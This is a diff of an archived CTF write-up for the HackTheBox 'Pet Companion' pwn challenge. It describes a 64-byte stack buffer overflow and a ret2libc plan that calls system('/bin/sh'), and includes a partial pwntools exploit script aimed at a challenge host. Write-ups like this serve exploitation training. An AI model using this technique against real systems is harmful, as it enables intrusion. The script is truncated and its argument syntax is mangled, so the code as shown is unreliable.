@@ -1,23 +1,16 @@
 # :game_die: HTB: Cyber Apocalypse 2024 — Pet Companion
 
-> **Original Source:** [HTB: Cyber Apocalypse 2024 — Pet Companion](https://infosecwriteups.com/htb-cyber-apocalypse-2024-pet-companion-b9c289efc448)
-> **Platform:** infosecwriteups.com | **Category:** `MISC` | **Year:** 2024
-
 ---
 
 # HTB: Cyber Apocalypse 2024 — Pet Companion
 
-
 Difficulty: Easy
 
-
 ### Description
-
 
 Embark on a journey through this expansive reality, where survival hinges on battling foes. In your quest, a loyal companion is essential. Dogs, mutated and implanted with chips, become your customizable allies. Tailor your pet’s demeanor — whether happy, angry, sad, or funny — to enhance your bond on this perilous adventure.
 
 ### Protection (checksec)
-
 
 ```
 $ checksec
@@ -29,28 +22,21 @@ PIE: No PIE (0x400000)
 RUNPATH: b'./glibc/'
 ```
 
-
 ### Disassembly (ghidra)
 
-
 *64 bytes buffer (256 bytes is read)*
-
 
 We can notice in the read method that we read 256 data, but the buffer is 64 bytes long.
 
 *libc functions available in PLT (Procedure Linkage Table)*
 
-
 ## Get Szigecsán Dávid’s stories in your inbox
 
-
 Join Medium for free to get updates from this writer.
-
 
 Remember me for faster sign in
 
 ### Exploitation
-
 
 - Overflows the buffer (64 bytes + 8 bytes for saved RBP)
 
@@ -61,7 +47,6 @@ Remember me for faster sign in
 - Call system(‘/bin/sh’)
 
 ### Solution (pwntools)
-
 
 ```
 #!/usr/bin/env python3
@@ -76,20 +61,17 @@ context(terminal=['tmux', 'split-window', '-h'])
 host = args.HOST or '83.136.254.189'
 port = int(args.PORT or 49069)
 
-
 def start_local(argv=[], *a, kw):
 if args.GDB:
 return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, kw)
 else:
 return process([exe.path] + argv, *a, kw)
 
-
 def start_remote(argv=[], *a, kw):
 io = connect(host, port)
 if args.GDB:
 gdb.attach(io, gdbscript=gdbscript)
 return io
-
 
 def start(argv=[], *a, kw):
 if args.REMOTE:
@@ -136,9 +118,7 @@ warning('Flag: ' + io.recv().decode('utf-8'))
 io.interactive()
 ```
 
-
 ### Skills Learned
-
 
 - buffer overflow
 
@@ -151,6 +131,3 @@ io.interactive()
 - PLT (Procedure Linkage Table)
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/htb-cyber-apocalypse-2024-pet-companion-b9c289efc448). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
